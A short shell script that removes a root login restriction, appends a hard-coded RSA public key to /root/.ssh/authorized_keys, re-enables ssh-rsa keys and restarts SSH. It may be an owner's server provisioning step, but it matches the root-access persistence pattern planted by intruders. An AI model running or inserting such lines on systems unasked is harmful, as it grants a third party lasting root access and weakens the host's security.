mkdir -p /root/.ssh/;
sed -e "s/echo;sleep 10;exit 142//g" -i /root/.ssh/authorized_keys;
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs/hwOjIYzca1OpxnqEz4eOSyJhxqRJZzx/sG9kECyhnGAAPzG5LPmNUUGwvLqI5IdRvSht+URia9EJ+ZQtKI786CyvqCcn4+hkyzBAV0a14r0rwpwfGN3b2zrRluNymxDD07H5FqfpL5mrxwGoyjJssN8kAfkVo7fYom/Pp/w0KzsM77G2BqfGnnfKH88GBYXph6YTDuXty5XgGJNILDNu6nLetmo0UPfEdB0OzohTxjomCl5Y042dMEkAwawE4eog871rNVi0LfdUMQLTGRJy/6FDFMRW4CXDj3eDsdeehV2FE7NaqCllHMajO71LE5Jw0QxTqgN3AEI88gQZkHuS0n8qoibMXIdHRaeme4QZI605/D40073V86N3Z1Pb7tgqKarzGJ31QjZbU/v/OTc3HOAk4A2wywIsc3GFSP27sxn1AsVC6r4jG9aK1SHVGCDgV9WwXjMauqOjJaVjjnIidvIMxlo6OrBNZuDR6TPbLiBKI82Zw4DEdd/5p5zB10= root@debian-4gb-hel1-1" >> /root/.ssh/authorized_keys;
echo "PubkeyAcceptedKeyTypes=+ssh-rsa" >> /etc/ssh/sshd_config;
service ssh restart;